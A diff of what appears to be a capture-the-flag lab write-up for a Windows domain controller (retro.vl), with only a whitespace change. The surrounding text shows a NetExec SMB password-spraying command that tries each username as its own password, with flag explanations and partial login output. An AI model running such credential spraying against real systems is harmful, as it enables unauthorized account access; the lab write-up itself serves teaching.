@@ -170,7 +170,8 @@ BANKING$
 I then tested all the users as their own usernames as the password:
 ```nxc smb dc.retro.vl -u users.txt -p users.txt --no-bruteforce --continue-on-success```
 * The `--no-bruteforce` basically says that don't try all possible password combinations on one user  
-* The `--continue-on-success` means that continue on success (obviously)  
+* The `--continue-on-success` means that continue on success (obviously)    
+
 ```
 SMB         10.10.122.201   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.10.122.201   445    DC               [-] retro.vl\Administrator:Administrator STATUS_LOGON_FAILURE 
